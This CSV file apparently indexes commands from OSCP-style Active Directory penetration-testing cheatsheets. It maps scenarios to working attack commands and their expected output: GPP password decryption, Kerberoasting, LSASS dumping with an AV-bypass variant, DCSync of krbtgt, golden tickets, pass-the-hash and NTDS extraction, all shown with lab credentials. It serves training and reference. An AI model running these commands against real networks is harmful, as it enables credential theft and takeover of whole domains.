"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"ad-lateral-movement-prep","gpp-password-files","section","","Phase 4: GPP Password Hunting","findstr /S /I cpassword \\corp.com\sysvol\corp.com\policies\*.xml","cpassword="
"ad-lateral-movement-prep","gpp-password-decrypt","section","","Phase 4: GPP Password Hunting","gpp-decrypt ""+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE""","Plaintext password displayed"
"ad-lateral-movement-prep","powerview-find-domainshare","section","","Phase 5: Credential Extraction from Shares","Find-DomainShare","Name"
"ad-service-account-hunting","setspn-list-user-spns","scenario","Scenario 1: Discovery Phase - Identify Kerberoastable Accounts","","",""
"ad-service-account-hunting","impacket-getuserspns-list","scenario","Scenario 1: Discovery Phase - Identify Kerberoastable Accounts","","",""
"ad-service-account-hunting","rubeus-kerberoast","scenario","Scenario 1: Discovery Phase - Identify Kerberoastable Accounts","","",""
"ad-service-account-hunting","impacket-getuserspns-kerberoast","scenario","Scenario 2: Modern Kerberoasting - Rubeus or impacket-GetUserSPNs","","",""
"ad-service-account-hunting","rubeus-kerberoast","scenario","Scenario 2: Modern Kerberoasting - Rubeus or impacket-GetUserSPNs","","",""
"ad-service-account-hunting","hashcat-crack-tgsrep","scenario","Scenario 2: Modern Kerberoasting - Rubeus or impacket-GetUserSPNs","","",""
"ad-service-account-hunting","powerview-kerberoast","scenario","Scenario 3: PowerView Automated Kerberoasting","","",""
"ad-service-account-hunting","hashcat-crack-tgsrep","scenario","Scenario 3: PowerView Automated Kerberoasting","","",""
"ad-service-account-hunting","impacket-getuserspns-list","scenario","Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree","","",""
"ad-service-account-hunting","impacket-getnpusers-identify","scenario","Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree","","",""
"ad-service-account-hunting","impacket-getuserspns-kerberoast","scenario","Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree","","",""
"ad-service-account-hunting","impacket-getnpusers-asreproast","scenario","Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree","","",""
"ad-service-account-hunting","hashcat-crack-tgsrep","scenario","Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree","","",""
"ad-service-account-hunting","hashcat-crack-asrep","scenario","Scenario 4: Kerberoasting vs AS-REP Roasting - Decision Tree","","",""
"ad-service-account-hunting","targeted-kerberoast-set","scenario","Scenario 5: Targeted Kerberoasting with GenericWrite Permissions","","",""
"ad-service-account-hunting","rubeus-kerberoast","scenario","Scenario 5: Targeted Kerberoasting with GenericWrite Permissions","","",""
"ad-service-account-hunting","impacket-getuserspns-kerberoast","scenario","Scenario 5: Targeted Kerberoasting with GenericWrite Permissions","","",""
"ad-service-account-hunting","hashcat-crack-tgsrep","scenario","Scenario 5: Targeted Kerberoasting with GenericWrite Permissions","","",""
"ad-service-account-hunting","targeted-kerberoast-cleanup","scenario","Scenario 5: Targeted Kerberoasting with GenericWrite Permissions","","",""
"ad-service-account-hunting","setspn-list-user-spns","section","","Phase 1: SPN Discovery","setspn -Q */*","CN="
"ad-service-account-hunting","impacket-getuserspns-list","section","","Phase 1: SPN Discovery","impacket-GetUserSPNs -dc-ip 192.168.50.70 corp.com/meg:""VimForPowerShell123!""","ServicePrincipalName"
"ad-service-account-hunting","rubeus-kerberoast","section","","Phase 1: SPN Discovery",".\Rubeus.exe kerberoast /outfile:C:\Tools\hashes.kerberoast","SamAccountName"
"ad-service-account-hunting","impacket-getuserspns-kerberoast","section","","Phase 2: TGS Ticket Request and Hash Extraction","impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:""VimForPowerShell123!""","ServicePrincipalName"
"ad-service-account-hunting","rubeus-kerberoast","section","","Phase 2: TGS Ticket Request and Hash Extraction",".\Rubeus.exe kerberoast /outfile:C:\Tools\hashes.kerberoast","SamAccountName"
"ad-service-account-hunting","rubeus-kerberoast-aes","section","","Phase 2: TGS Ticket Request and Hash Extraction",".\Rubeus.exe kerberoast /tgtdeleg /outfile:C:\Tools\hashes_rc4.kerberoast","Supported ETypes       : RC4_HMAC_DEFAULT"
"ad-service-account-hunting","hashcat-crack-tgsrep","section","","Phase 3: Offline Hash Cracking","hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Cracked"
"ad-service-account-hunting","crackmapexec-validate-admin","section","","Phase 4: Credential Validation and Privilege Escalation","crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com","[+]"
"ad-service-account-hunting","setspn-list-user-spns","section","","SPN Account Types and Crackability Quick Reference","setspn -Q */*","CN="
"ad-service-account-hunting","impacket-getuserspns-list","section","","SPN Account Types and Crackability Quick Reference","impacket-GetUserSPNs -dc-ip 192.168.50.70 corp.com/meg:""VimForPowerShell123!""","ServicePrincipalName"
"mimikatz-oscp-comprehensive","mimikatz-privilege-debug","scenario","Scenario 1: Initial Foothold - Harvest Credentials from Memory","","",""
"mimikatz-oscp-comprehensive","mimikatz-sekurlsa-logonpasswords","scenario","Scenario 1: Initial Foothold - Harvest Credentials from Memory","","",""
"mimikatz-oscp-comprehensive","procdump-lsass-dump","scenario","Scenario 2: AV Bypass - Offline Extraction When Defender Blocks Mimikatz","","",""
"mimikatz-oscp-comprehensive","comsvcs-lsass-dump","scenario","Scenario 2: AV Bypass - Offline Extraction When Defender Blocks Mimikatz","","",""
"mimikatz-oscp-comprehensive","pypykatz-parse-lsass","scenario","Scenario 2: AV Bypass - Offline Extraction When Defender Blocks Mimikatz","","",""
"mimikatz-oscp-comprehensive","ad-dcsync-mimikatz-krbtgt","scenario","Scenario 3: DCSync to Golden Ticket - Persistent Domain Access","","",""
"mimikatz-oscp-comprehensive","mimikatz-kerberos-purge","scenario","Scenario 3: DCSync to Golden Ticket - Persistent Domain Access","","",""
"mimikatz-oscp-comprehensive","mimikatz-kerberos-ptt","scenario","Scenario 3: DCSync to Golden Ticket - Persistent Domain Access","","",""
"mimikatz-oscp-comprehensive","mimikatz-sekurlsa-tickets-export","scenario","Scenario 4: Pass-the-Ticket - Reuse Exported Kerberos Tickets","","",""
"mimikatz-oscp-comprehensive","mimikatz-kerberos-purge","scenario","Scenario 4: Pass-the-Ticket - Reuse Exported Kerberos Tickets","","",""
"mimikatz-oscp-comprehensive","mimikatz-kerberos-ptt","scenario","Scenario 4: Pass-the-Ticket - Reuse Exported Kerberos Tickets","","",""
"mimikatz-oscp-comprehensive","mimikatz-kerberos-list","scenario","Scenario 4: Pass-the-Ticket - Reuse Exported Kerberos Tickets","","",""
"mimikatz-oscp-comprehensive","mimikatz-lsadump-sam","scenario","Scenario 5: Registry Dumps - Credential Guard Blocks LSASS Access","","",""
"mimikatz-oscp-comprehensive","mimikatz-lsadump-secrets","scenario","Scenario 5: Registry Dumps - Credential Guard Blocks LSASS Access","","",""
"mimikatz-oscp-comprehensive","mimikatz-lsadump-cache","scenario","Scenario 5: Registry Dumps - Credential Guard Blocks LSASS Access","","",""
"mimikatz-oscp-comprehensive","mimikatz-privilege-debug","section","","Phase 1: Prerequisites & Upload",".\mimikatz.exe ""privilege::debug"" ""exit""","Privilege '20' OK (SeDebugPrivilege enabled)"
"mimikatz-oscp-comprehensive","mimikatz-sekurlsa-logonpasswords","section","","Phase 2: LSASS Memory Credential Extraction",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""","User Name: admin, Domain: CORP, NTLM: 8846f7ea..."
"mimikatz-oscp-comprehensive","mimikatz-sekurlsa-tickets-export","section","","Phase 2: LSASS Memory Credential Extraction",".\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""","Saved to file: [0;3e7]-2-0-40e10000-admin@krbtgt-CORP.kirbi"
"mimikatz-oscp-comprehensive","procdump-lsass-dump","section","","Phase 3: AV Bypass - Alternative LSASS Extraction Methods",".\procdump64.exe -accepteula -ma lsass.exe lsass.dmp","Dump 1 complete: 156 MB written in 8.2 seconds"
"mimikatz-oscp-comprehensive","comsvcs-lsass-dump","section","","Phase 3: AV Bypass - Alternative LSASS Extraction Methods","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\Temp\lsass.dmp full","No output (silent success, verify file created)"
"mimikatz-oscp-comprehensive","pypykatz-parse-lsass","section","","Phase 3: AV Bypass - Alternative LSASS Extraction Methods","pypykatz lsa minidump lsass.dmp","username admin, NT: 8846f7eaee8fb117ad06bdd830b7586c"
"mimikatz-oscp-comprehensive","mimikatz-lsadump-sam","section","","Phase 4: Registry-Based Credential Dumps",".\mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::sam"" ""exit""","RID: 000001f4 (500), User: Administrator, NTLM: aad3b435..."
"mimikatz-oscp-comprehensive","mimikatz-lsadump-secrets","section","","Phase 4: Registry-Based Credential Dumps",".\mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::secrets"" ""exit""","Secret: _SC_MSSQLSERVER, text: P@ssw0rd123!"
"mimikatz-oscp-comprehensive","mimikatz-lsadump-cache","section","","Phase 4: Registry-Based Credential Dumps",".\mimikatz.exe ""privilege::debug"" ""token::elevate"" ""lsadump::cache"" ""exit""","User: jdoe, MsCacheV2: e2d81a7f8b9c... (hashcat mode 2100)"
"mimikatz-oscp-comprehensive","mimikatz-kerberos-list","section","","Phase 5: Kerberos Ticket Manipulation",".\mimikatz.exe ""kerberos::list"" ""exit""","Server Name: krbtgt/CORP.COM, Client: admin@CORP.COM"
"mimikatz-oscp-comprehensive","mimikatz-kerberos-ptt","section","","Phase 5: Kerberos Ticket Manipulation",".\mimikatz.exe ""kerberos::ptt admin.kirbi"" ""exit""","Injecting ticket: OK"
"mimikatz-oscp-comprehensive","mimikatz-kerberos-purge","section","","Phase 5: Kerberos Ticket Manipulation",".\mimikatz.exe ""kerberos::purge"" ""exit""","Ticket(s) purge for current session is OK"
"mimikatz-oscp-comprehensive","ad-dcsync-mimikatz-krbtgt","section","","Phase 6: DCSync Attack - Remote Credential Dumping","mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt","User: krbtgt, NTLM: 1693c6cefafffc7af11ef34d1c788f47"
"mimikatz-oscp-comprehensive","mimikatz-kerberos-purge","section","","Phase 8: Cleanup & OPSEC",".\mimikatz.exe ""kerberos::purge"" ""exit""","Ticket(s) purge for current session is OK"
"ad-dcsync-methodology","ad-dcsync-check-user-groups","scenario","Scenario 1: Understanding DC Sync Prerequisites and Rights Verification","","",""
"ad-dcsync-methodology","ad-dcsync-check-domain-admins","scenario","Scenario 1: Understanding DC Sync Prerequisites and Rights Verification","","",""
"ad-dcsync-methodology","ad-dcsync-check-replication-rights","scenario","Scenario 1: Understanding DC Sync Prerequisites and Rights Verification","","",""
"ad-dcsync-methodology","ad-dcsync-secretsdump-user","scenario","Scenario 2: Extracting Single User Credentials with DCSync","","",""
"ad-dcsync-methodology","ad-dcsync-mimikatz-user","scenario","Scenario 2: Extracting Single User Credentials with DCSync","","",""
"ad-dcsync-methodology","windows-hashcat-crack-ntlm","scenario","Scenario 2: Extracting Single User Credentials with DCSync","","",""
"ad-dcsync-methodology","ad-pass-the-hash-impacket-psexec","scenario","Scenario 2: Extracting Single User Credentials with DCSync","","",""
"ad-dcsync-methodology","ad-dcsync-secretsdump-krbtgt","scenario","Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack","","",""
"ad-dcsync-methodology","ad-dcsync-mimikatz-krbtgt","scenario","Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack","","",""
"ad-dcsync-methodology","ad-sid-whoami-extract","scenario","Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack","","",""
"ad-dcsync-methodology","ad-golden-ticket-ticketer-create","scenario","Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack","","",""
"ad-dcsync-methodology","ad-golden-ticket-mimikatz-create","scenario","Scenario 3: Extracting krbtgt Hash for Golden Ticket Attack","","",""
"ad-dcsync-methodology","windows-hashcat-crack-ntlm-file","scenario","Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration","","",""
"ad-dcsync-methodology","ad-pass-the-hash-crackmapexec","scenario","Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration","","",""
"ad-dcsync-methodology","ad-pass-the-hash-impacket-psexec","scenario","Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration","","",""
"ad-dcsync-methodology","ad-pass-the-hash-impacket-wmiexec","scenario","Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration","","",""
"ad-dcsync-methodology","windows-rdp-xfreerdp","scenario","Scenario 4: Hash Cracking Workflow and Pass-the-Hash Integration","","",""
"ad-dcsync-methodology","ad-dcsync-check-user-groups","section","","Phase 1: Prerequisites and Rights Verification","whoami /groups","Output contains: 'GROUP INFORMATION'"
"ad-dcsync-methodology","ad-dcsync-check-domain-admins","section","","Phase 1: Prerequisites and Rights Verification","net group ""Domain Admins"" /domain","Output contains: 'Group name     Domain Admins'"
"ad-dcsync-methodology","ad-dcsync-check-replication-rights","section","","Phase 1: Prerequisites and Rights Verification","powershell -c ""(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -eq 'CORP\jeffadmin' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType""","Output shows: IdentityReference = <DOMAIN>\<USERNAME>"
"ad-dcsync-methodology","ad-dcsync-mimikatz-user","section","","Phase 2: Credential Extraction (Windows - Mimikatz)","mimikatz # lsadump::dcsync /user:corp\dave","Output: '[DC] <DOMAIN>.com will be the domain'"
"ad-dcsync-methodology","ad-dcsync-mimikatz-krbtgt","section","","Phase 2: Credential Extraction (Windows - Mimikatz)","mimikatz # lsadump::dcsync /user:corp\krbtgt","Output: 'SAM Username : krbtgt'"
"ad-dcsync-methodology","ad-dcsync-mimikatz-administrator","section","","Phase 2: Credential Extraction (Windows - Mimikatz)","mimikatz # lsadump::dcsync /user:corp\Administrator","Output: 'SAM Username : Administrator'"
"ad-dcsync-methodology","ad-dcsync-secretsdump-user","section","","Phase 3: Credential Extraction (Linux - Impacket) [RECOMMENDED]","impacket-secretsdump -just-dc-user dave 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'","Output: 'Impacket v0.x.x - Copyright 2022 SecureAuth Corp..."
"ad-dcsync-methodology","ad-dcsync-secretsdump-krbtgt","section","","Phase 3: Credential Extraction (Linux - Impacket) [RECOMMENDED]","impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'","Output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTL..."
"ad-dcsync-methodology","ad-dcsync-secretsdump-all","section","","Phase 3: Credential Extraction (Linux - Impacket) [RECOMMENDED]","impacket-secretsdump -just-dc 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'","Output: '[*] Dumping Domain Credentials (domain\uid:rid:l..."
"ad-dcsync-methodology","windows-hashcat-crack-ntlm","section","","Phase 4: Hash Cracking and Pass-the-Hash","hashcat -m 1000 -a 0 dave_hash.txt /usr/share/wordlists/rockyou.txt --force","Output: 'Session..........: hashcat'"
"ad-dcsync-methodology","ad-pass-the-hash-crackmapexec","section","","Phase 4: Hash Cracking and Pass-the-Hash","crackmapexec smb 192.168.50.0/24 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com","Output: '<IP> (Pwn3d!)' - User has LOCAL ADMINISTRATOR ri..."
"ad-dcsync-methodology","ad-pass-the-hash-impacket-psexec","section","","Phase 4: Hash Cracking and Pass-the-Hash","impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75","Output: '[*] Requesting shares on <TARGET>....'"
"ad-dcsync-methodology","ad-sid-whoami-extract","section","","Phase 5: Persistence via Golden Ticket","whoami /user","Output displays 'User Name' and 'SID' columns"
"ad-dcsync-methodology","ad-golden-ticket-purge-tickets","section","","Phase 5: Persistence via Golden Ticket","mimikatz # kerberos::purge","Output: 'Ticket(s) purge for current session is OK'"
"ad-dcsync-methodology","ad-golden-ticket-mimikatz-create","section","","Phase 5: Persistence via Golden Ticket","mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt","Output: 'User      : <username>'"
"ad-dcsync-methodology","ad-golden-ticket-ticketer-create","section","","Phase 5: Persistence via Golden Ticket","","See command documentation"
"ad-shadow-copy-ntds-extraction-methodology","ad-vshadow-create-shadow","scenario","Scenario 1: vshadow.exe Method (Official OSCP Content)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-copy-ntds-from-shadow","scenario","Scenario 1: vshadow.exe Method (Official OSCP Content)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-reg-save-system-hive","scenario","Scenario 1: vshadow.exe Method (Official OSCP Content)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-secretsdump-parse-ntds","scenario","Scenario 1: vshadow.exe Method (Official OSCP Content)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-vssadmin-delete-shadows","scenario","Scenario 1: vshadow.exe Method (Official OSCP Content)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-check-vss-service","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-vssadmin-list-shadows","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-vssadmin-create-shadow","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-copy-ntds-from-shadow","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-reg-save-system-hive","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-secretsdump-parse-ntds","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-vssadmin-delete-shadows","scenario","Scenario 2: Native vssadmin Method (No Tool Upload)","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-diskshadow-create-shadow","scenario","Scenario 3: Automated diskshadow Scripting","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-copy-ntds-from-shadow","scenario","Scenario 3: Automated diskshadow Scripting","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-reg-save-system-hive","scenario","Scenario 3: Automated diskshadow Scripting","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-secretsdump-parse-ntds","scenario","Scenario 3: Automated diskshadow Scripting","","",""
"ad-shadow-copy-ntds-extraction-methodology","ad-vssadmin-delete-shadows","scenario","Scenario 3: Automated diskshadow Scripting","","",""
"ad-initial-reconnaissance","net-user-domain-list","scenario","Scenario 1: Initial Shell on Domain Workstation","","",""
"ad-initial-reconnaissance","net-group-domain-admins","scenario","Scenario 1: Initial Shell on Domain Workstation","","",""
"ad-initial-reconnaissance","net-group-domain-computers","scenario","Scenario 1: Initial Shell on Domain Workstation","","",""
"ad-initial-reconnaissance","setspn-list-all","scenario","Scenario 1: Initial Shell on Domain Workstation","","",""
"ad-initial-reconnaissance","net-domain-controllers","scenario","Scenario 1: Initial Shell on Domain Workstation","","",""
"ad-initial-reconnaissance","ps-ldapsearch-function","scenario","Scenario 2: RDP Access with PowerShell Available","","",""
"ad-initial-reconnaissance","ps-ldapsearch-users","scenario","Scenario 2: RDP Access with PowerShell Available","","",""
"ad-initial-reconnaissance","ps-ldapsearch-computers","scenario","Scenario 2: RDP Access with PowerShell Available","","",""
"ad-initial-reconnaissance","ps-ldapsearch-groups","scenario","Scenario 2: RDP Access with PowerShell Available","","",""
"ad-initial-reconnaissance","ps-ldapsearch-spns","scenario","Scenario 2: RDP Access with PowerShell Available","","",""
"ad-initial-reconnaissance","ps-ldapsearch-admins","scenario","Scenario 2: RDP Access with PowerShell Available","","",""
"ad-initial-reconnaissance","powerview-get-netdomain","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","powerview-get-netdomaincontroller","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","powerview-get-netuser-spn","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","powerview-get-netgroup-recursive","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","powerview-get-netcomputer-ping","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","powerview-get-netou","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","powerview-get-netgpo","scenario","Scenario 3: PowerView Available - Comprehensive Enumeration","","",""
"ad-initial-reconnaissance","dsquery-users","scenario","Scenario 4: Restricted Shell - Legacy Tools Only","","",""
"ad-initial-reconnaissance","dsquery-computers","scenario","Scenario 4: Restricted Shell - Legacy Tools Only","","",""
"ad-initial-reconnaissance","dsquery-admins","scenario","Scenario 4: Restricted Shell - Legacy Tools Only","","",""
"ad-initial-reconnaissance","setspn-list-all","scenario","Scenario 4: Restricted Shell - Legacy Tools Only","","",""
"ad-initial-reconnaissance","dsquery-domain-controllers","scenario","Scenario 4: Restricted Shell - Legacy Tools Only","","",""
"ad-initial-reconnaissance","net-user-domain-list","section","","Phase 1: Confirm Domain Membership & Identify DCs","net user /domain","User accounts for \\"
"ad-initial-reconnaissance","net-domain-controllers","section","","Phase 1: Confirm Domain Membership & Identify DCs","nltest /dclist:corp.com","PDC"
"ad-initial-reconnaissance","net-user-domain-list","section","","Phase 2: Basic Object Enumeration (Legacy Tools)","net user /domain","User accounts for \\"
"ad-initial-reconnaissance","net-group-domain-admins","section","","Phase 2: Basic Object Enumeration (Legacy Tools)","net group ""Domain Admins"" /domain","Group name"
"ad-initial-reconnaissance","net-group-domain-computers","section","","Phase 2: Basic Object Enumeration (Legacy Tools)","net group ""Domain Computers"" /domain","Group name"
"ad-initial-reconnaissance","setspn-list-all","section","","Phase 2: Basic Object Enumeration (Legacy Tools)","setspn -T corp.com -Q */*","CN="
"ad-initial-reconnaissance","ps-ldapsearch-function","section","","Phase 3: Manual PowerShell LDAP Queries","function LDAPSearch { param ([string]$LDAPQuery); $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]'').distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$PDC/$DistinguishedName""); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }","Function created successfully"
"ad-initial-reconnaissance","ps-ldapsearch-users","section","","Phase 3: Manual PowerShell LDAP Queries","LDAPSearch -LDAPQuery ""(objectClass=user)""","Properties"
"ad-initial-reconnaissance","ps-ldapsearch-computers","section","","Phase 3: Manual PowerShell LDAP Queries","LDAPSearch -LDAPQuery ""(objectClass=computer)""","dnshostname"
"ad-initial-reconnaissance","ps-ldapsearch-groups","section","","Phase 3: Manual PowerShell LDAP Queries","LDAPSearch -LDAPQuery ""(objectClass=group)""","cn"
"ad-initial-reconnaissance","ps-ldapsearch-spns","section","","Phase 3: Manual PowerShell LDAP Queries","LDAPSearch -LDAPQuery ""(&(objectClass=user)(servicePrincipalName=*))""","serviceprincipalname"
"ad-initial-reconnaissance","powerview-get-netdomain","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetDomain","Forest"
"ad-initial-reconnaissance","powerview-get-netdomaincontroller","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetDomainController","Forest"
"ad-initial-reconnaissance","powerview-get-netuser-all","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetUser | select samaccountname,description,pwdlastset,lastlogon","samaccountname"
"ad-initial-reconnaissance","powerview-get-netuser-spn","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetUser -SPN | select samaccountname,serviceprincipalname","samaccountname"
"ad-initial-reconnaissance","powerview-get-netgroup-recursive","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetGroupMember -GroupName ""Domain Admins"" -Recurse","MemberName"
"ad-initial-reconnaissance","powerview-get-netcomputer-all","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetComputer | select dnshostname,operatingsystem,lastlogon","dnshostname"
"ad-initial-reconnaissance","powerview-get-netou","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetOU | select name,distinguishedname","name"
"ad-initial-reconnaissance","powerview-get-netgpo","section","","Phase 4: PowerView Comprehensive Enumeration","Get-NetGPO | select displayname,whenchanged","displayname"
"ad-initial-reconnaissance","dsquery-users","section","","Phase 5: Advanced Queries (dsquery)","dsquery user","CN="
"ad-initial-reconnaissance","dsquery-computers","section","","Phase 5: Advanced Queries (dsquery)","dsquery computer","CN="
"ad-initial-reconnaissance","dsquery-admins","section","","Phase 5: Advanced Queries (dsquery)","dsquery group -name ""Domain Admins"" | dsget group -members","CN="
"ad-initial-reconnaissance","dsquery-domain-controllers","section","","Phase 5: Advanced Queries (dsquery)","dsquery server","CN="
"ad-pass-the-hash-attacks","pth-verify-hash-format","scenario","Scenario 1: Understanding Pass-the-Hash (Why Does This Work?)","","",""
"ad-pass-the-hash-attacks","secretsdump-hashes","scenario","Scenario 1: Understanding Pass-the-Hash (Why Does This Work?)","","",""
"ad-pass-the-hash-attacks","secretsdump-hashes","scenario","Scenario 2: Hash Extraction and Format Validation","","",""
"ad-pass-the-hash-attacks","mimikatz-logonpasswords","scenario","Scenario 2: Hash Extraction and Format Validation","","",""
"ad-pass-the-hash-attacks","pth-verify-hash-format","scenario","Scenario 2: Hash Extraction and Format Validation","","",""
"ad-pass-the-hash-attacks","pth-cme-spray","scenario","Scenario 3: Testing Hash Validity with CrackMapExec","","",""
"ad-pass-the-hash-attacks","cme-smb-auth-test","scenario","Scenario 3: Testing Hash Validity with CrackMapExec","","",""
"ad-pass-the-hash-attacks","pth-impacket-psexec","scenario","Scenario 4: Lateral Movement with Impacket Pass-the-Hash","","",""
"ad-pass-the-hash-attacks","pth-impacket-wmiexec","scenario","Scenario 4: Lateral Movement with Impacket Pass-the-Hash","","",""
"ad-pass-the-hash-attacks","pth-impacket-smbexec","scenario","Scenario 4: Lateral Movement with Impacket Pass-the-Hash","","",""
"ad-pass-the-hash-attacks","pth-verify-hash-format","scenario","Scenario 5: UAC Restrictions and RID-500 Bypass","","",""
"ad-pass-the-hash-attacks","secretsdump-hashes","scenario","Scenario 5: UAC Restrictions and RID-500 Bypass","","",""
"ad-pass-the-hash-attacks","pth-impacket-psexec","scenario","Scenario 5: UAC Restrictions and RID-500 Bypass","","",""
"ad-pass-the-hash-attacks","evil-winrm-hash","scenario","Scenario 6: Evil-WinRM Pass-the-Hash for Interactive Shell","","",""
"ad-pass-the-hash-attacks","pth-evil-winrm","scenario","Scenario 6: Evil-WinRM Pass-the-Hash for Interactive Shell","","",""
"ad-pass-the-hash-attacks","secretsdump-hashes","section","","Phase 1: Hash Extraction","impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'","Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
"ad-pass-the-hash-attacks","mimikatz-logonpasswords","section","","Phase 1: Hash Extraction","","See command documentation"
